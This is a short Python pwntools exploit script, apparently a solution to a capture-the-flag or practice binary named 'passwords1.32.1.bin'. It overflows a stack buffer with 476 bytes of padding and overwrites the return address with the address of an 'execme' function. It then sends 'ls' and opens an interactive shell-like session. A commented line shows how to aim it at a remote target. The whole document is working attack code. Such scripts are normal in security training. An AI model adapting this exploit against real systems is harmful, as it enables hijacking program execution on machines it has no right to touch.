import pwn 

elf = pwn.ELF("./passwords1.32.1.bin")

offset = 476

new_eip = pwn.p32(elf.symbols["execme"])
return_address = pwn.p32(elf.symbols["main"])

payload = b"".join(
  [
    b"A" * offset,
    new_eip,
    return_address
  ]  
)

payload += b"\n"
#remoto p = pwn.remote(target,port)


p = elf.process()
p.sendline(b"1")
p.sendline(payload)
p.sendline(b"ls")
p.interactive()
